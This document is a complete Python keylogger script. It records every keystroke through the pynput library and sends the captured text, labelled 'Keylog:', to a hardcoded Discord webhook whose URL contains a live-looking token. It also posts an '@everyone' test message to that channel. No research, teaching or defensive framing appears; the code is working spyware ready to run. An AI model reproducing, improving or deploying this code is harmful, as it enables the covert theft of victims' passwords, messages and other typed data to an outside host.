import requests
import os
import shutil
import sys
import subprocess
from pynput.keyboard import Key, Listener

# Set up Discord webhook
webhook_url = "https://discord.com/api/webhooks/1451046126433206303/yxpWCB9_9g1XyCpTPyn_SU375jMJVrX39-iEpg24qf-SR0Jqx6vSrpd0ejgQ7xw0BGR-"

# Test webhook (optional, to check if it works)
data = {
    "content": "@everyone"
}
try:
    response = requests.post(webhook_url, json=data)
    print(f"Test response: {response.status_code}")  # Should be 204 if successful
except Exception as e:
    print(f"Test failed: {e}")

# Logger
full_log = ''
word = ''
log_char_limit = 20  # Renamed for clarity

def on_press(key):
    global word
    global full_log
    global log_char_limit
    if key == Key.space:
        word += ' '

    elif key == Key.enter:
        full_log += word + '\n'
        word = ''
        if len(full_log) >= log_char_limit:
            print(full_log)
            send_log()
            full_log = ''

    elif key == Key.tab:
        word += '\t'

    elif key in (Key.shift, Key.shift_l, Key.shift_r):
        return

    elif key == Key.backspace:
        word = word[:-1]

    else:
        try:
            word += key.char
        except AttributeError:
            pass

def send_log():
    # Send the log directly as JSON content (no file needed)
    data = {
        "content": f"Keylog: {full_log}"  # Prefix for clarity; Discord handles long text
    }
    try:
        response = requests.post(webhook_url, json=data)
        print(f"Send response: {response.status_code}")  # Should be 204 if successful
    except Exception as e:
        print(f"Send failed: {e}")

with Listener(on_press=on_press) as listener:
    listener.join()
